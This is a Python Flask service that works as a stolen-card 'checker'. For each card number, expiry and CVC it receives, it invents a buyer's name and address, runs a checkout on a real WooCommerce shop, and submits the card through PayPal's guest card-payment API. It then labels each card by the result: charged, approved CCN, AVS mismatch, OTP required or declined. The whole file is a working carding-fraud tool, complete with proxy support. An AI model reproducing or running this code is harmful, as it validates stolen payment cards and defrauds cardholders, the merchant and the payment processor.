import requests
import re
import random
import string
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from flask import Flask, request, jsonify

app = Flask(__name__)

# Function to setup proxy session
def setup_proxy_session(proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy,
        }
    return session

# Function to generate random full name
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown"]
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

# Function to generate random address
def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

# Function to generate random email
def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

# Function to generate random phone number
def num():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def check_card(card_input, proxy=None):
    # Parse card details
    parts = card_input.split('|')
    if len(parts) != 4:
        return {"status": "error", "message": "Invalid card format", "input": card_input}

    n, mm, yy, cvc = parts

    # Format month and year
    if len(mm) == 1:
        mm = f'0{mm}'
    if "20" in yy:
        yy = yy.split("20")[1]

    # Generate user info
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_random_account()
    num_val = num()

    # Create session with proxy
    user = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    r = setup_proxy_session(proxy)

    # Set timeouts for requests
    r.mount('https://', requests.adapters.HTTPAdapter(max_retries=3))
    timeout = 30  # seconds per request

    # Initial GET
    try:
        r.get('https://switchupcb.com/shop/i-buy/', headers={
            'User-Agent': user,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1'
        }, timeout=timeout)
    except Exception as e:
        pass

    # First request: Add to cart
    files = {
        'quantity': (None, '1'),
        'add-to-cart': (None, '4451'),
    }
    multipart_data = MultipartEncoder(fields=files)
    headers = {
        'authority': 'switchupcb.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': multipart_data.content_type,
        'origin': 'https://switchupcb.com',
        'referer': 'https://switchupcb.com/shop/i-buy/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    try:
        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=timeout)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "error", "message": f"Add to cart failed: {e}"}

    # Second request: Checkout
    headers = {
        'authority': 'switchupcb.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://switchupcb.com/cart/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    try:
        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, timeout=timeout)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "error", "message": f"Checkout failed: {e}"}

    # Extract security tokens
    try:
        sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
        # nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
    except AttributeError:
        return {"status": "error", "message": "Failed to extract security tokens"}

    # Update order review
    headers = {
        'authority': 'switchupcb.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://switchupcb.com',
        'referer': 'https://switchupcb.com/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }

    params = {'wc-ajax': 'update_order_review'}
    data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{num_val}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'

    try:
        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, timeout=timeout)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "error", "message": f"Update order review failed: {e}"}

    # Create order
    headers = {
        'authority': 'switchupcb.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://switchupcb.com',
        'pragma': 'no-cache',
        'referer': 'https://switchupcb.com/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }

    params = {'wc-ajax': 'ppc-create-order'}
    json_data = {
        'nonce': create,
        'payer': None,
        'bn_code': 'Woo_PPCP',
        'context': 'checkout',
        'order_id': '0',
        'payment_method': 'ppcp-gateway',
        'funding_source': 'card',
        'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num_val}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        'createaccount': False,
        'save_payment_method': False,
    }

    try:
        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, timeout=timeout)
        response.raise_for_status()
        id = response.json()['data']['id']
    except (requests.RequestException, KeyError, ValueError) as e:
        return {"status": "error", "message": f"Failed to extract order ID: {e}"}

    # Generate random session IDs
    lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
    session_id = f'uid_{lol1}_{lol3}'
    button_session_id = f'uid_{lol1}_{lol3}' # Reusing similar pattern

    # PayPal request
    headers = {
        'authority': 'www.paypal.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://www.paypal.com/smart/buttons',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    params = {
        'sessionID': session_id,
        'buttonSessionID': button_session_id,
        'locale.x': 'en_US',
        'commit': 'true',
        'hasShippingCallback': 'false',
        'env': 'production',
        'country.x': 'US',
        'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
        'disable-card': '',
        'token': id,
    }

    try:
        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, timeout=timeout)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "error", "message": f"PayPal card fields request failed: {e}"}

    # Final payment request
    headers = {
        'authority': 'www.paypal.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'referer': 'https://www.paypal.com/smart/card-fields',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': id,
            'card': {
                'cardNumber': n,
                'type': 'VISA',
                'expirationDate': mm+'/20'+yy,
                'postalCode': zip_code,
                'securityCode': cvc,
            },
            'firstName': first_name,
            'lastName': last_name,
            'billingAddress': {
                'givenName': first_name,
                'familyName': last_name,
                'line1': street_address,
                'line2': None,
                'city': city,
                'state': state,
                'postalCode': zip_code,
                'country': 'US',
            },
            'email': acc,
            'currencyConversionType': 'VENDOR',
        },
        'operationName': 'payWithCard',
    }

    try:
        response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, timeout=timeout)
        response.raise_for_status()
        last = response.text
    except requests.RequestException as e:
        return {"status": "error", "message": f"Final payment request failed: {e}"}

    # Process response
    if ('ADD_SHIPPING_ERROR' in last or
        'NEED_CREDIT_CARD' in last or
        '"status": "succeeded"' in last or
        'Thank You For Donation.' in last or
        'Your payment has already been processed' in last or
        'Success ' in last):
        return {"status": "success", "result": "CHARGE 2$"}
    elif 'is3DSecureRequired' in last or 'OTP' in last:
        return {"status": "success", "result": "OTP [REQUIRED]"}
    elif 'INVALID_SECURITY_CODE' in last:
        return {"status": "success", "result": "APPROVED CCN"}
    elif 'INVALID_BILLING_ADDRESS' in last:
        return {"status": "success", "result": "APPROVED - AVS"}
    elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
        return {"status": "success", "result": "APPROVED! - EXISTING_ACCOUNT_RESTRICTED"}
    else:
        try:
            message = response.json()['errors'][0]['message']
            code = response.json()['errors'][0]['data'][0]['code']
            return {"status": "declined", "code": code, "message": message}
        except:
             return {"status": "error", "message": "Unknown Error", "response": last}

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    if not data or 'card' not in data:
        return jsonify({"error": "No card provided"}), 400
    
    card_input = data.get('card')
    proxy = data.get('proxy')
    
    result = check_card(card_input, proxy)
    return jsonify(result)

import os
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
